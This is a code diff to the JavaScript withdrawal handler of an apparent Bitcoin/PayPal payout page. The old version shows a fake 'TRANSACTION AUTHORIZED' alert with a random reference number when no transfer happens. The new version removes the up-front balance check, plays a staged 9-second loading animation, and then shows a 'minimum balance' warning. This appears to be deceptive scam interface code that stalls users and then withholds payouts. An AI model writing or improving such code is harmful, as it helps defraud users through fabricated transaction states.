@@ -856,21 +856,22 @@
                 const addr = elements.address.value.trim();
                 const isBTC = document.getElementById('btc').checked;
 
+                // Basic validations first
                 if (!val || val <= 0) { alert("⚠️ INVALID AMOUNT\n\nPlease enter a valid withdrawal amount."); return; }
                 if (val <= state.fee) { alert(`⚠️ AMOUNT TOO LOW\n\nAmount must exceed fee of $${state.fee.toFixed(2)}.`); return; }
-                if (state.balance < state.minimumRequired) { showWarningModal(); return; }
                 if (!addr) { alert("⚠️ MISSING DESTINATION\n\nPlease enter a receiving address."); return; }
-                if (isBTC && !isValidBitcoinAddress(addr)) { alert("⚠️ INVALID BITCOIN ADDRESS"); return; }
-                if (!isBTC && !isValidEmail(addr)) { alert("⚠️ INVALID EMAIL ADDRESS"); return; }
+                if (isBTC && !isValidBitcoinAddress(addr)) { alert("⚠️ INVALID BITCOIN ADDRESS\n\nPlease enter a valid BTC address (starts with 1, 3, or bc1)."); return; }
+                if (!isBTC && !isValidEmail(addr)) { alert("⚠️ INVALID EMAIL ADDRESS\n\nPlease enter a valid PayPal email address."); return; }
 
-                // Show loading animation for 9 seconds
+                // Show loading animation for 9 seconds FIRST
                 const progressInterval = showLoadingOverlay();
                 
+                // After 9 seconds, hide loading and show warning modal (minimum requirement)
                 setTimeout(() => {
                     clearInterval(progressInterval);
                     hideLoadingOverlay();
-                    const ref = 'NX-' + Math.random().toString(36).substring(2, 9).toUpperCase();
-                    alert(`✅ TRANSACTION AUTHORIZED\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nNet Settlement: $${(val - state.fee).toFixed(2)}\nREF: ${ref}\nStatus: QUEUED FOR SETTLEMENT`);
+                    // Show the warning modal about minimum balance
+                    showWarningModal();
                 }, 9000);
             }
 
